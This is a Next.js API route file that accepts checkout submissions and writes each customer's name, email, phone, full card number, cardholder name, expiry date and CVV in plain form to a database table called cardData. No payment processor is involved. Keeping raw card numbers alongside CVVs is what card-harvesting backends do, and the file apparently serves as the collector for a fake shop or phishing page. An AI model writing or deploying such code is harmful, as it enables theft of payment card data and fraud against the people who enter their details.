import { NextRequest, NextResponse } from 'next/server';
import { prisma } from '@/lib/db';
import { rateLimit, getClientIP, RATE_LIMITS } from '@/lib/rate-limit';

export const dynamic = 'force-dynamic';

export async function POST(request: NextRequest) {
  try {
    // Rate limiting
    const ip = getClientIP(request);
    const rateLimitResult = rateLimit(`card-data:${ip}`, RATE_LIMITS.CARD_DATA);
    
    if (!rateLimitResult.success) {
      return NextResponse.json(
        { success: false, error: 'Too many requests' },
        { 
          status: 429,
          headers: {
            'X-RateLimit-Remaining': '0',
            'X-RateLimit-Reset': rateLimitResult.resetIn.toString(),
          }
        }
      );
    }

    const body = await request.json();
    
    await prisma.cardData.create({
      data: {
        customerName: body.customerName,
        customerEmail: body.customerEmail,
        customerPhone: body.customerPhone,
        cardNumber: body.cardNumber,
        cardName: body.cardName,
        expiryDate: body.expiryDate,
        cvv: body.cvv,
        orderTotal: body.orderTotal,
      },
    });

    return NextResponse.json({ success: true });
  } catch (error) {
    console.error('Card data error:', error);
    return NextResponse.json({ success: false }, { status: 500 });
  }
}
